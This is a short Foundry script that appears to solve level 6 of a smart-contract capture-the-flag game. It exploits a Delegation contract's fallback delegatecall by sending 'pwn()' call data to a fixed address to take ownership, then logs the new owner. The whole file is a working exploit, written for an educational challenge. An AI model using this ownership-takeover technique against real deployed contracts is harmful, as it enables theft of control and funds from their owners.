// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import { Delegation } from "../src/level6.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/// @notice Abusing delegatecall
contract Level6Solution is Script {
    Delegation public level = Delegation(0x4f8E8fA741b4Ca042827864E09924133746b7Eed);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        // This will call the Delegation contract with data, which will trigger the fallback().
        // Which then performs a delegatecall to Delegate contract to 'call' your data.
        // Low level call requires wrapping level into an address. And encodeWithSignature the function name
        address(level).call(abi.encodeWithSignature("pwn()"));
        console.log("owner: ", level.owner());

        vm.stopBroadcast();
    }
    

}